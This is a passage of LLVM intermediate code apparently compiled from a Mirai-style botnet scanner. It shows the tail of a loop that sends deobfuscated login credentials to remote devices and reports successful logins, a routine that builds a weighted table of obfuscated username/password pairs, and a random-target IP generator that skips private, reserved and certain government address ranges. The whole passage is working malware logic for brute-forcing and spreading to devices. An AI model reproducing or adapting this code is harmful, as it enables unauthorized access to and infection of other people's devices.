  %840 = sext i32 %839 to i64
  %841 = call i64 @send(i32 noundef %837, i8* noundef %838, i64 noundef %840, i32 noundef 16384)
  %842 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %843 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %842, i32 0, i32 1
  %844 = load i32, i32* %843, align 8
  %845 = call i64 @send(i32 noundef %844, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 7)
  %846 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %847 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %846, i32 0, i32 3
  store i32 9, i32* %847, align 8
  br label %848

848:                                              ; preds = %833, %829
  br label %919

849:                                              ; preds = %703
  %850 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %851 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %850)
  store i32 %851, i32* %33, align 4
  %852 = icmp sgt i32 %851, 0
  br i1 %852, label %853, label %868

853:                                              ; preds = %849
  call void @table_unlock_val(i8 noundef zeroext 8)
  %854 = call i8* @table_retrieve_val(i32 noundef 8, i32* noundef %43)
  store i8* %854, i8** %42, align 8
  %855 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %856 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %855, i32 0, i32 1
  %857 = load i32, i32* %856, align 8
  %858 = load i8*, i8** %42, align 8
  %859 = load i32, i32* %43, align 4
  %860 = sext i32 %859 to i64
  %861 = call i64 @send(i32 noundef %857, i8* noundef %858, i64 noundef %860, i32 noundef 16384)
  %862 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %863 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %862, i32 0, i32 1
  %864 = load i32, i32* %863, align 8
  %865 = call i64 @send(i32 noundef %864, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 8)
  %866 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %867 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %866, i32 0, i32 3
  store i32 10, i32* %867, align 8
  br label %868

868:                                              ; preds = %853, %849
  br label %919

869:                                              ; preds = %703
  %870 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %871 = call i32 @consume_resp_prompt(%struct.scanner_connection* noundef %870)
  store i32 %871, i32* %33, align 4
  %872 = load i32, i32* %33, align 4
  %873 = icmp eq i32 %872, -1
  br i1 %873, label %874, label %895

874:                                              ; preds = %869
  %875 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %876 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %875, i32 0, i32 1
  %877 = load i32, i32* %876, align 8
  %878 = call i32 @close(i32 noundef %877)
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %879, i32 0, i32 1
  store i32 -1, i32* %880, align 8
  %881 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %882 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %881, i32 0, i32 8
  %883 = load i8, i8* %882, align 8
  %884 = add i8 %883, 1
  store i8 %884, i8* %882, align 8
  %885 = zext i8 %884 to i32
  %886 = icmp eq i32 %885, 10
  br i1 %886, label %887, label %892

887:                                              ; preds = %874
  %888 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %889 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %888, i32 0, i32 8
  store i8 0, i8* %889, align 8
  %890 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %891 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %890, i32 0, i32 3
  store i32 0, i32* %891, align 8
  br label %894

892:                                              ; preds = %874
  %893 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %893)
  br label %894

894:                                              ; preds = %892, %887
  br label %917

895:                                              ; preds = %869
  %896 = load i32, i32* %33, align 4
  %897 = icmp sgt i32 %896, 0
  br i1 %897, label %898, label %916

898:                                              ; preds = %895
  %899 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %900 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %899, i32 0, i32 4
  %901 = load i32, i32* %900, align 4
  %902 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %903 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %902, i32 0, i32 5
  %904 = load i16, i16* %903, align 8
  %905 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %906 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %905, i32 0, i32 0
  %907 = load %struct.scanner_auth*, %struct.scanner_auth** %906, align 8
  call void @report_working(i32 noundef %901, i16 noundef zeroext %904, %struct.scanner_auth* noundef %907)
  %908 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %909 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %908, i32 0, i32 1
  %910 = load i32, i32* %909, align 8
  %911 = call i32 @close(i32 noundef %910)
  %912 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %913 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %912, i32 0, i32 1
  store i32 -1, i32* %913, align 8
  %914 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %915 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %914, i32 0, i32 3
  store i32 0, i32* %915, align 8
  br label %916

916:                                              ; preds = %898, %895
  br label %917

917:                                              ; preds = %916, %894
  br label %919

918:                                              ; preds = %703
  store i32 0, i32* %33, align 4
  br label %919

919:                                              ; preds = %918, %917, %868, %848, %828, %808, %788, %768, %741, %714
  %920 = load i32, i32* %33, align 4
  %921 = icmp eq i32 %920, 0
  br i1 %921, label %922, label %923

922:                                              ; preds = %919
  br label %953

923:                                              ; preds = %919
  %924 = load i32, i32* %33, align 4
  %925 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %926 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %925, i32 0, i32 6
  %927 = load i32, i32* %926, align 4
  %928 = icmp sgt i32 %924, %927
  br i1 %928, label %929, label %933

929:                                              ; preds = %923
  %930 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %931 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %930, i32 0, i32 6
  %932 = load i32, i32* %931, align 4
  store i32 %932, i32* %33, align 4
  br label %933

933:                                              ; preds = %929, %923
  %934 = load i32, i32* %33, align 4
  %935 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %936 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %935, i32 0, i32 6
  %937 = load i32, i32* %936, align 4
  %938 = sub nsw i32 %937, %934
  store i32 %938, i32* %936, align 4
  %939 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %940 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %939, i32 0, i32 7
  %941 = getelementptr inbounds [256 x i8], [256 x i8]* %940, i64 0, i64 0
  %942 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %943 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %942, i32 0, i32 7
  %944 = getelementptr inbounds [256 x i8], [256 x i8]* %943, i64 0, i64 0
  %945 = load i32, i32* %33, align 4
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds i8, i8* %944, i64 %946
  %948 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %949 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %948, i32 0, i32 6
  %950 = load i32, i32* %949, align 4
  %951 = sext i32 %950 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %941, i8* align 1 %947, i64 %951, i1 false)
  br label %952

952:                                              ; preds = %933
  br label %703

953:                                              ; preds = %922
  br label %616

954:                                              ; preds = %693, %621
  br label %955

955:                                              ; preds = %954, %598
  br label %956

956:                                              ; preds = %955, %586, %549
  %957 = load i32, i32* %1, align 4
  %958 = add nsw i32 %957, 1
  store i32 %958, i32* %1, align 4
  br label %537, !llvm.loop !49

959:                                              ; preds = %537
  br label %149
}

declare void @rand_init() #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 noundef zeroext) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @add_auth_entry(i8* noundef %0, i8* noundef %1, i16 noundef zeroext %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* noundef %9, i64 noundef %13) #7
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* noundef %16, i32* noundef %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* noundef %30, i32* noundef %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

6:                                                ; preds = %2315, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = and i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* %2, align 1
  %11 = load i32, i32* %1, align 4
  %12 = lshr i32 %11, 8
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %1, align 4
  %16 = lshr i32 %15, 16
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %1, align 4
  %20 = lshr i32 %19, 24
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  br label %23

23:                                               ; preds = %6
  %24 = load i8, i8* %2, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 127
  br i1 %26, label %2315, label %27

27:                                               ; preds = %23
  %28 = load i8, i8* %2, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %2315, label %31

31:                                               ; preds = %27
  %32 = load i8, i8* %2, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 3
  br i1 %34, label %2315, label %35

35:                                               ; preds = %31
  %36 = load i8, i8* %2, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 15
  br i1 %38, label %2315, label %39

39:                                               ; preds = %35
  %40 = load i8, i8* %2, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 56
  br i1 %42, label %2315, label %43

43:                                               ; preds = %39
  %44 = load i8, i8* %2, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 10
  br i1 %46, label %2315, label %47

47:                                               ; preds = %43
  %48 = load i8, i8* %2, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 25
  br i1 %50, label %2315, label %51

51:                                               ; preds = %47
  %52 = load i8, i8* %2, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 49
  br i1 %54, label %2315, label %55

55:                                               ; preds = %51
  %56 = load i8, i8* %2, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 50
  br i1 %58, label %2315, label %59

59:                                               ; preds = %55
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 137
  br i1 %62, label %2315, label %63

63:                                               ; preds = %59
  %64 = load i8, i8* %2, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 6
  br i1 %66, label %2315, label %67

67:                                               ; preds = %63
  %68 = load i8, i8* %2, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 7
  br i1 %70, label %2315, label %71

71:                                               ; preds = %67
  %72 = load i8, i8* %2, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 11
  br i1 %74, label %2315, label %75

75:                                               ; preds = %71
  %76 = load i8, i8* %2, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 21
  br i1 %78, label %2315, label %79

79:                                               ; preds = %75
  %80 = load i8, i8* %2, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 22
  br i1 %82, label %2315, label %83

83:                                               ; preds = %79
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 26
  br i1 %86, label %2315, label %87

87:                                               ; preds = %83
  %88 = load i8, i8* %2, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 28
  br i1 %90, label %2315, label %91

91:                                               ; preds = %87
  %92 = load i8, i8* %2, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 29
  br i1 %94, label %2315, label %95

95:                                               ; preds = %91
  %96 = load i8, i8* %2, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 30
  br i1 %98, label %2315, label %99

99:                                               ; preds = %95
  %100 = load i8, i8* %2, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 33
  br i1 %102, label %2315, label %103

103:                                              ; preds = %99
  %104 = load i8, i8* %2, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 55
  br i1 %106, label %2315, label %107

107:                                              ; preds = %103
  %108 = load i8, i8* %2, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 214
  br i1 %110, label %2315, label %111

111:                                              ; preds = %107
  %112 = load i8, i8* %2, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 215
  br i1 %114, label %2315, label %115

115:                                              ; preds = %111
  %116 = load i8, i8* %2, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 192
  br i1 %118, label %119, label %123

119:                                              ; preds = %115
  %120 = load i8, i8* %3, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 168
  br i1 %122, label %2315, label %123

123:                                              ; preds = %119, %115
  %124 = load i8, i8* %2, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 146
  br i1 %126, label %127, label %131

127:                                              ; preds = %123
  %128 = load i8, i8* %3, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 17
  br i1 %130, label %2315, label %131

131:                                              ; preds = %127, %123
  %132 = load i8, i8* %2, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 146
  br i1 %134, label %135, label %139

135:                                              ; preds = %131
  %136 = load i8, i8* %3, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 80
  br i1 %138, label %2315, label %139

139:                                              ; preds = %135, %131
  %140 = load i8, i8* %2, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 146
  br i1 %142, label %143, label %147

143:                                              ; preds = %139
  %144 = load i8, i8* %3, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 98
  br i1 %146, label %2315, label %147

147:                                              ; preds = %143, %139
  %148 = load i8, i8* %2, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 146
  br i1 %150, label %151, label %155

151:                                              ; preds = %147
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 154
  br i1 %154, label %2315, label %155

155:                                              ; preds = %151, %147
  %156 = load i8, i8* %2, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 147
  br i1 %158, label %159, label %163

159:                                              ; preds = %155
  %160 = load i8, i8* %3, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 159
  br i1 %162, label %2315, label %163

163:                                              ; preds = %159, %155
  %164 = load i8, i8* %2, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 148
  br i1 %166, label %167, label %171

167:                                              ; preds = %163
  %168 = load i8, i8* %3, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 114
  br i1 %170, label %2315, label %171

171:                                              ; preds = %167, %163
  %172 = load i8, i8* %2, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 150
  br i1 %174, label %175, label %179

175:                                              ; preds = %171
  %176 = load i8, i8* %3, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 125
  br i1 %178, label %2315, label %179

179:                                              ; preds = %175, %171
  %180 = load i8, i8* %2, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 150
  br i1 %182, label %183, label %187

183:                                              ; preds = %179
  %184 = load i8, i8* %3, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 133
  br i1 %186, label %2315, label %187

187:                                              ; preds = %183, %179
  %188 = load i8, i8* %2, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 150
  br i1 %190, label %191, label %195

191:                                              ; preds = %187
  %192 = load i8, i8* %3, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 144
  br i1 %194, label %2315, label %195

195:                                              ; preds = %191, %187
  %196 = load i8, i8* %2, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 150
  br i1 %198, label %199, label %203

199:                                              ; preds = %195
  %200 = load i8, i8* %3, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 149
  br i1 %202, label %2315, label %203

203:                                              ; preds = %199, %195
  %204 = load i8, i8* %2, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 150
  br i1 %206, label %207, label %211

207:                                              ; preds = %203
  %208 = load i8, i8* %3, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 157
  br i1 %210, label %2315, label %211

211:                                              ; preds = %207, %203
  %212 = load i8, i8* %2, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 150
  br i1 %214, label %215, label %219

215:                                              ; preds = %211
  %216 = load i8, i8* %3, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 184
  br i1 %218, label %2315, label %219

219:                                              ; preds = %215, %211
  %220 = load i8, i8* %2, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 150
  br i1 %222, label %223, label %227

223:                                              ; preds = %219
  %224 = load i8, i8* %3, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 190
  br i1 %226, label %2315, label %227

227:                                              ; preds = %223, %219
  %228 = load i8, i8* %2, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 150
  br i1 %230, label %231, label %235

231:                                              ; preds = %227
  %232 = load i8, i8* %3, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 196
  br i1 %234, label %2315, label %235

235:                                              ; preds = %231, %227
  %236 = load i8, i8* %2, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp eq i32 %237, 152
  br i1 %238, label %239, label %243

239:                                              ; preds = %235
  %240 = load i8, i8* %3, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 82
  br i1 %242, label %2315, label %243

243:                                              ; preds = %239, %235
  %244 = load i8, i8* %2, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 152
  br i1 %246, label %247, label %251

247:                                              ; preds = %243
  %248 = load i8, i8* %3, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 229
  br i1 %250, label %2315, label %251

251:                                              ; preds = %247, %243
  %252 = load i8, i8* %2, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp eq i32 %253, 157
  br i1 %254, label %255, label %259

255:                                              ; preds = %251
  %256 = load i8, i8* %3, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp eq i32 %257, 202
  br i1 %258, label %2315, label %259

259:                                              ; preds = %255, %251
  %260 = load i8, i8* %2, align 1
  %261 = zext i8 %260 to i32
  %262 = icmp eq i32 %261, 157
  br i1 %262, label %263, label %267

263:                                              ; preds = %259
  %264 = load i8, i8* %3, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp eq i32 %265, 217
  br i1 %266, label %2315, label %267

267:                                              ; preds = %263, %259
  %268 = load i8, i8* %2, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 161
  br i1 %270, label %271, label %275

271:                                              ; preds = %267
  %272 = load i8, i8* %3, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp eq i32 %273, 124
  br i1 %274, label %2315, label %275

275:                                              ; preds = %271, %267
  %276 = load i8, i8* %2, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 162
  br i1 %278, label %279, label %283

279:                                              ; preds = %275
  %280 = load i8, i8* %3, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 32
  br i1 %282, label %2315, label %283

283:                                              ; preds = %279, %275
  %284 = load i8, i8* %2, align 1
  %285 = zext i8 %284 to i32
  %286 = icmp eq i32 %285, 155
  br i1 %286, label %287, label %291

287:                                              ; preds = %283
  %288 = load i8, i8* %3, align 1
  %289 = zext i8 %288 to i32
  %290 = icmp eq i32 %289, 96
  br i1 %290, label %2315, label %291

291:                                              ; preds = %287, %283
  %292 = load i8, i8* %2, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp eq i32 %293, 155
  br i1 %294, label %295, label %299

295:                                              ; preds = %291
  %296 = load i8, i8* %3, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 149
  br i1 %298, label %2315, label %299

299:                                              ; preds = %295, %291
  %300 = load i8, i8* %2, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 155
  br i1 %302, label %303, label %307

303:                                              ; preds = %299
  %304 = load i8, i8* %3, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp eq i32 %305, 155
  br i1 %306, label %2315, label %307

307:                                              ; preds = %303, %299
  %308 = load i8, i8* %2, align 1
  %309 = zext i8 %308 to i32
  %310 = icmp eq i32 %309, 155
  br i1 %310, label %311, label %315

311:                                              ; preds = %307
  %312 = load i8, i8* %3, align 1
  %313 = zext i8 %312 to i32
  %314 = icmp eq i32 %313, 178
  br i1 %314, label %2315, label %315

315:                                              ; preds = %311, %307
  %316 = load i8, i8* %2, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp eq i32 %317, 164
  br i1 %318, label %319, label %323

319:                                              ; preds = %315
  %320 = load i8, i8* %3, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp eq i32 %321, 158
  br i1 %322, label %2315, label %323

323:                                              ; preds = %319, %315
  %324 = load i8, i8* %2, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp eq i32 %325, 156
  br i1 %326, label %327, label %331

327:                                              ; preds = %323
  %328 = load i8, i8* %3, align 1
  %329 = zext i8 %328 to i32
  %330 = icmp eq i32 %329, 9
  br i1 %330, label %2315, label %331

331:                                              ; preds = %327, %323
  %332 = load i8, i8* %2, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp eq i32 %333, 167
  br i1 %334, label %335, label %339

335:                                              ; preds = %331
  %336 = load i8, i8* %3, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp eq i32 %337, 44
  br i1 %338, label %2315, label %339

339:                                              ; preds = %335, %331
  %340 = load i8, i8* %2, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp eq i32 %341, 168
  br i1 %342, label %343, label %347

343:                                              ; preds = %339
  %344 = load i8, i8* %3, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp eq i32 %345, 68
  br i1 %346, label %2315, label %347

347:                                              ; preds = %343, %339
  %348 = load i8, i8* %2, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 168
  br i1 %350, label %351, label %355

351:                                              ; preds = %347
  %352 = load i8, i8* %3, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp eq i32 %353, 85
  br i1 %354, label %2315, label %355

355:                                              ; preds = %351, %347
  %356 = load i8, i8* %2, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp eq i32 %357, 168
  br i1 %358, label %359, label %363

359:                                              ; preds = %355
  %360 = load i8, i8* %3, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 102
  br i1 %362, label %2315, label %363

363:                                              ; preds = %359, %355
  %364 = load i8, i8* %2, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 203
  br i1 %366, label %367, label %371

367:                                              ; preds = %363
  %368 = load i8, i8* %3, align 1
  %369 = zext i8 %368 to i32
  %370 = icmp eq i32 %369, 59
  br i1 %370, label %2315, label %371

371:                                              ; preds = %367, %363
  %372 = load i8, i8* %2, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp eq i32 %373, 204
  br i1 %374, label %375, label %379

375:                                              ; preds = %371
  %376 = load i8, i8* %3, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp eq i32 %377, 34
  br i1 %378, label %2315, label %379

379:                                              ; preds = %375, %371
  %380 = load i8, i8* %2, align 1
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 207
  br i1 %382, label %383, label %387

383:                                              ; preds = %379
  %384 = load i8, i8* %3, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 30
  br i1 %386, label %2315, label %387

387:                                              ; preds = %383, %379
  %388 = load i8, i8* %2, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp eq i32 %389, 117
  br i1 %390, label %391, label %395

391:                                              ; preds = %387
  %392 = load i8, i8* %3, align 1
  %393 = zext i8 %392 to i32
  %394 = icmp eq i32 %393, 55
  br i1 %394, label %2315, label %395

395:                                              ; preds = %391, %387
  %396 = load i8, i8* %2, align 1
  %397 = zext i8 %396 to i32
